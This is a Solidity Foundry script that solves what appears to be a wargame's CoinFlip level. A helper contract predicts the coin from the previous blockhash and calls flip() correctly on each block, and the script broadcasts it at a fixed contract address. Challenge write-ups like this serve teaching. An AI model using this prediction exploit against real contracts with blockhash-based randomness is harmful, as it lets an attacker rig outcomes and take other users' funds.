//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Goal:
//Win the game 10 times in a row

//Solution:
//Create another smart contract that replicates the same algorithm logic , get the right guesses on the same block .
//We have to run the script ten times ,each time on a different block.
import {CoinFlip} from "../src/Coinflip.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";

contract Player {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinflipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinflipInstance.flip(side);
    }
}

contract CoinflipSolution is Script {
    CoinFlip public coinflipInstance =
        CoinFlip(payable(0xea8445dF2cB2C25C826baFb35D4A86619c5122FA));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Player(coinflipInstance);
        console.log("consecutiveWins: ", coinflipInstance.consecutiveWins());

        vm.stopBroadcast();
    }
}
